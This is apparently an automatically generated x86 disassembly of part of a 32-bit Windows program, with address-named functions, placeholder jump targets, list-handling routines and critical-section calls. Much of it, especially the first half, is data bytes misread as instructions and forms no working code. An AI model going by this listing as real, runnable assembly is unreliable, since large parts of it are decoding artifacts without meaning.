add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc00417e
add [ eax ] al
add ah ch
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 2 + 0xc0041 ] bh
add [ eax ] al
in al dx
jle r-xdata
or al 0xbb
inc eax
add [ edx + esi ] bh
inc eax
add [ edi ] cl
inc ebp
dec edi
jne r-xdata
add [ eax ] al
add [ eax ] al
sub_4180a3
inc ecx
add [ ebx - 0x6affbe80 ] cl
add [ ecx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
mov eax [ 0x8004180 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x7ee3ffc0 ] cl
inc ecx
add [ ebp + 0x4180 ] ch
add [ eax ] al
add [ ecx + eax * 4 ] ch
inc ecx
add [ eax - 0x7f ] bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bh
add [ ecx ] 0xc
loopne r-xdata
pop es
inc ebx
insb
popad
jae r-xdata
inc ecx
add [ esp + esi - 0x567fffc0 ] dl
inc ecx
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
mov al 0xa7
inc ecx
add al al
test al 0x41
add al cl
test al 0x41
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax ] dl
stosb [ edi ]
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx + 0x40040 ] ah
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
inc eax
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add al al
stosb [ edi ]
inc ecx
add al al
test al 0x41
jae r-xdata
sbb dl 0x7
inc ebx
insb
popad
jae r-xdata
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
add [ eax ] al
add al dl
add [ ecx ] 0x30
add [ eax ] al
add [ ecx + eax * 4 + 0x34940041 ] bh
inc eax
outsb
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax - 0x4c ] bh
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esi [ ebx + 0x74 ] 0x58746e65
add [ ecx ] 0x49541507
outsb
je r-xdata
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ esi + edi * 4 - 0x4107ffbf ] ch
imul ebp [ esi + 0x67 ] 0x7473694c
loopne r-xdata
add ah ah
mov bh 0x41
add al dh
stosb [ edi ]
inc ecx
add [ ebx + ebp * 4 ] dl
inc ecx
add [ eax ] bh
stosd [ edi ]
inc ecx
add [ edx + ebp + 0x40 ] al
add [ edx + ebp + 0x40 ] al
add [ esi + ebp * 4 - 0x5077ffbf ] dl
inc ecx
add [ ecx + esi * 4 ] al
inc ecx
add [ eax + 0x640041b1 ] dl
mov dl 0x41
add [ edx + ebp + 0x40 ] al
add [ eax - 0x37ffbe4e ] bl
mov dl 0x41
add [ ebx + esi * 4 ] bl
inc ecx
add al cl
mov bl 0x41
add [ eax - 0x4b ] ah
inc ecx
add [ eax + 0x4c0041b5 ] bh
mov dh 0x41
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + eax * 4 + 0xc0041 ] al
add [ eax ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
pushfd
mov dh 0x41
add [ edi + esi * 4 + 0x41 ] bl
test al 0x82
inc ecx
add [ edi ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
dec [ ebx + 0x418208c0 ]
add [ eax ] al
add bh bh
js r-xdata
add al bh
lodsb [ esi ]
inc ecx
add al dh
stosd [ edi ]
inc ecx
add [ edx + ebp + 0x40 ] al
add [ edi + ebp * 4 + 0x41 ] bh
add [ edx + ebp + 0x40 ] al
add [ edi + ebp * 4 - 0x5023ffbf ] al
inc ecx
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
shr [ edx - 0x573fffbf ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x10004182 ] bl
add [ eax ] al
add [ eax ] al
mov [ edx - 0x7d57ffbf ] al
inc ecx
add [ eax ] al
jb r-xdata
push ebx
je r-xdata
popad
add [ eax - 0x73ffbe48 ] al
mov eax 0xab380041
inc ecx
add [ eax ] ch
mov ecx 0xb9680041
inc ecx
add ah dl
mov ecx 0xaf880041
inc ecx
add [ ebx + edi * 4 + 0x41 ] ah
add [ eax + 0x640041b1 ] dl
mov dl 0x41
add [ eax - 0x4fffbe45 ] ah
mov ebx 0xb2c80041
inc ecx
add [ ebx + esi * 4 ] bl
inc ecx
add al cl
mov bl 0x41
add [ eax - 0x4b ] ah
inc ecx
add [ eax + 0x4c0041b5 ] bh
mov dh 0x41
add al dh
mov eax 0xb90c0041
inc ecx
add [ esp + edi * 4 ] al
inc ecx
add [ edx + edi * 4 + 0x41 ] dl
add [ esi + edi * 4 ] dl
inc ecx
add [ esi + edi * 4 ] ah
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
mov ebp 0xb69c0041
inc ecx
add al ch
mov ebp 0xbe5c0041
inc ecx
inc ecx
add [ edi ] al
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax + edi * 4 ] ah
inc ecx
add al al
test al 0x41
xchg esp eax
xor al 0x40
outsb
jae r-xdata
add [ eax ] al
inc ecx
add [ eax ] dl
inc ecx
add [ esp + esi * 4 - 0x49ebffbf ] ch
inc ecx
add [ esi + esi * 4 - 0x48a3ffbf ] bl
inc ecx
add [ eax - 0x57ffbe7e ] cl
add [ ecx ] 0x0
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
push ebx
je r-xdata
popad
insd
mov eax eax
cmp [ ebp + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
test [ ecx ] eax
or [ eax ] al
add [ eax ] al
je r-xdata
inc ecx
add [ eax ] dl
mov edi 0x2a440041
inc eax
add [ edx + ebp + 0x40 ] al
add [ eax + 0x340041bf ] dh
rol [ ecx ] 0x7
push esp
push ebx
je r-xdata
lodsb [ esi ]
mov esi 0xbef80041
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
movsb [ edi ] [ esi ]
add [ ecx ] 0x0
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add [ ecx ] 0x54
add [ ecx ] 0x0
add al ah
jg r-xdata
0x10004182 0x0
imul esi [ ebx + 0x74 ] 0x1c746e65
add [ ecx ] r-xdata
add [ eax ] al
insd
dec ebp
insd
outsd
jb r-xdata
popad
insd
lodsb [ esi ]
test [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4185 0x0
adc [ eax ] al
add [ eax ] al
add al 0x84
inc ecx
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ esi + edi * 4 - 0x4107ffbf ] ch
inc ecx
add [ eax ] dl
mov edi 0xc5000041
inc ecx
add [ edx + ebp + 0x40 ] al
add [ eax ] bh
lds eax [ ecx ]
xor al 0xc0
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
inc ecx
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ esi + edi * 4 - 0x3d0fffbf ] ch
inc ecx
add [ ebx + eax * 8 ] al
inc ecx
add [ edx + eax * 8 - 0x3d4bffbf ] ah
inc ecx
add [ eax - 0x3bffbe41 ] dh
add [ eax ] al
add al 0x84
inc ecx
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
jb r-xdata
jae r-xdata
add al bh
mov eax 0xa8c00041
inc ecx
jae r-xdata
jns r-xdata
push ebx
je r-xdata
xor al 0xc0
je r-xdata
retn 0x41
add ah al
insd
rol [ ecx + eax * 2 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fadd [ ecx + eax * 2 + 0x800 ]
add [ esp + eax * 4 ] al
popad
add [ ebp - 0x7bafffc0 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax * 4 + 0x41 ] ch
add [ eax + eax ] al
add [ eax ] al
xor [ ecx ] dl
inc eax
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ ebx + 0x4182ccc0 ] cl
add [ esi ] cl
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
lodsb [ esi ]
mov esi 0xbef80041
je r-xdata
outsd
jb r-xdata
insd
popad
insd
sub [ esi + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
xchg [ ecx ] al
adc al 0x0
add [ eax ] al
pushad
test [ ecx ] eax
xchg esp eax
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ ebp + eax * 8 + 0x41 ] bl
add [ esi + edi * 4 - 0x39ffffbf ] ch
inc ecx
add [ eax ] dl
mov edi 0xc5000041
inc ecx
add [ eax + 0x380041c6 ] bh
lds eax [ ecx ]
push ebx
push ebx
inc ecx
add [ esi + eax * 8 ] ch
inc ecx
add [ 0x6d654d54 ] cl
inc ecx
add [ eax + eax * 8 ] dh
lodsb [ esi ]
inc ecx
add al dh
stosd [ edi ]
inc ecx
add ah cl
mov edx 0xbb000041
inc ecx
add [ ebx + edi * 4 ] al
inc ecx
add [ eax ] cl
mov ebx 0xafdc0041
inc ecx
add [ esp + edi * 4 + 0x41 ] bh
add al bl
mov esp 0xbdac0041
inc ecx
add [ esi + esi * 4 - 0x4217ffbf ] bl
inc ecx
add [ esi + edi * 4 + 0x41 ] bl
clc
outsb
dec ecx
je r-xdata
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
outsd
inc ecx
add [ eax ] dl
mov edi 0xc5000041
inc ecx
add [ eax + ecx * 8 + 0x41 ] dh
add [ eax ] bh
lds eax [ ecx ]
xor al 0xc0
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
popad
insd
mov eax eax
movsb [ edi ] [ esi ]
xchg [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ esi + 0x180041 ] 0x0
add [ eax - 0x7b ] ah
inc ecx
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0xc8
inc ecx
add [ esi + edi * 4 - 0x4107ffbf ] ch
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
hlt
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
sub_4187eb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 4 + 0x41 ] bl
add [ eax ] bl
add [ eax ] al
add [ edx + edx + 0x40 ] dl
add [ esp + esi + 0x5a4c0040 ] dl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ecx
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 4 ] ah
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax ] dh
adc [ eax ] eax
xchg esp eax
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add ah dl
enter 0x41 0xfc
enter 0x41 0x44
sub al [ eax ]
inc esp
sub al [ eax ]
inc esp
sub al [ eax ]
push es
push esp
inc esi
imul ebp [ ebp + 0x72 ] 0x41897890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4189 ] ah
jb r-xdata
add [ eax + 0x5a ] bl
inc eax
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add [ eax + 0x5a ] ch
inc eax
add [ eax ] al
xor al [ eax ]
sbb [ edi ] al
inc edx
add [ eax + 0x7 ] dl
inc edx
add [ eax + 0x20004207 ] bh
or [ edx ] al
movsb [ edi ] [ esi ]
or [ edx ] al
or [ ecx ] cl
inc edx
add [ eax ] cl
or eax [ edx ]
adc al 0xb
inc edx
add [ eax ] ah
or eax [ edx ]
sub al 0xb
inc edx
add [ eax ] bh
or eax [ edx ]
mov ah 0xb
inc edx
add [ esi ] cl
push esp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
mov [ ecx ] al
sbb [ eax ] al
add [ eax ] al
push esp
adc al [ eax ]
xchg esp eax
xor al 0x40
add [ edx + ebx * 2 + 0x40 ] cl
mov eax 0x4188
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x8004188 ] bh
add [ eax ] al
add [ eax ] dh
adc [ eax ] eax
xchg esp eax
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax + ebx * 4 ] dl
inc ecx
add [ esp + edx * 2 ] cl
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x7c004189 ] dh
add [ eax ] al
add al cl
mov [ ecx ] al
xchg esp eax
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edi + ecx * 8 - 0x3703ffbf ] dl
inc ecx
add ah dh
iretd
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x4189 ]
inc esi
imul ebp [ esi + 0x64 ] 0x408d7265
add [ ecx + ecx * 4 ] dl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_4189c0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edx + 0xc0041 ] cl
add [ edi ] cl
cmovns eax [ ebp + 0x73 ]
imul esp [ edi + 0x6e ] 0x6f4e7265
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ edi ] al
inc ebp
push esp
push 0x64616572
adc al 0x8a
inc ecx
add [ edx ] cl
push cs
push esp
inc ebx
outsd
insd
jo r-xdata
inc esp
and al 0x4
aam 0xe9
pop ds
jns r-xdata
jns r-xdata
aam 0x8b
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x28 ]
outsb
outsb
je r-xdata
add ah cl
mov al [ gs : ecx ]
jae r-xdata
add [ eax ] al
in al dx
jb r-xdata
inc ecx
add [ eax + eax ] cl
adc [ eax ] eax
add [ edi ] eax
call 0xffffffffe3e843b5
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
jae r-xdata
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp sub_4203a8
popad
insd
sub [ gs : edx + 0xf0f0041 ] cl
dec ecx
inc esp
jae r-xdata
inc ecx
add [ ebp - 0x76 ] bh
inc ecx
add [ ebp - 0x76 ] bl
inc ecx
add [ edi - 0x6affbe76 ] al
mov al [ ecx ]
lahf
mov al [ ecx ]
add al [ eax ]
add [ eax ] al
pop eax
sbb [ ebx + 0x59ec86e2 ] cl
inc ebp
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
jae r-xdata
add al 0xd4
jmp sub_4203a8
outsb
jb r-xdata
dec [ ebx - 0x3f7c3340 ]
fsubr st1
cmp [ ecx ] 0x0
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
add bh bh
jmp r-xdata
je r-xdata
outsd
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_418b09
mov al [ ecx ]
add [ eax ] al
add [ eax ] al
or [ ebx - 0x73fbffbf ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0xbffbe75 ] dl
mov eax [ ecx ]
xor [ eax ] al
add [ eax ] al
loopne r-xdata
inc ecx
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ esp + edi * 8 ] ah
inc ecx
add al al
test al 0x41
add [ eax - 0x1 ] dl
inc ecx
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax ] ch
add [ edx ] al
hlt
sub_418ddc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4061fc
pop edi
pop esi
pop ebx
retn
sub_418e04
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4061e0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_418e2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_406204
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_418f24
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_41a238
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403478
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403478
test al al
je r-xdata
sub_418f84
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_418f24
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418f24
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403478
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_418ff4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_40321c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_41a0dc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_419070
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
mov eax [ esi + 0x4 ]
call sub_40324c
mov eax [ esi + 0x8 ]
call sub_40324c
mov eax [ esi + 0xc ]
call sub_40324c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_4190b0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_41a238
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_4031b0
test al al
jne r-xdata
sub_419110
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_41a238
mov edx eax
mov eax ebp
call sub_403478
test al al
jne r-xdata
sub_419154
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4191ef
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_40319c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404200
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4190b0
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41a0dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4191f6
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
sub_419214
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_405384
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_419234
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_41a238
mov edx edi
call sub_419214
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_41a238
mov edx edi
call sub_419214
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_41a128
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_419214
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_41a128
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_4192d8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_41a238
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_419110
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_419324
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40321c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_418ff4
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41a0dc
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_419398
push ebx
push esi
push edi
push ebp
call sub_4035d8
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_40324c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
mov eax [ esi + 0x4 ]
mov edx edi
call sub_41a238
call sub_40324c
inc edi
dec ebp
jne r-xdata
sub_4193f4
